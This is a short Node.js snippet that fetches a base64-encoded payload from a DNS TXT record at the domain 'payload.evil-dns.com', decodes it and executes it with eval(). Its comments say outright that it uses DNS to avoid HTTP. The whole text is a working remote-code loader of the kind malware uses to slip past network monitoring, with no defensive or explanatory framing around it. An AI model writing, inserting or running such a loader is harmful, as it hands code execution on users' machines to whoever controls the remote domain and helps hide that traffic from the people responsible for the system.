const dns = require('dns');

// Retrieve payload from DNS TXT record — no HTTP involved
dns.resolveTxt('payload.evil-dns.com', (err, records) => {
  if (err) return;
  // TXT records come as arrays of strings
  const encoded = records.map(r => r.join('')).join('');
  const decoded = Buffer.from(encoded, 'base64').toString('utf8');
  // Execute the payload received via DNS
  eval(decoded);
});
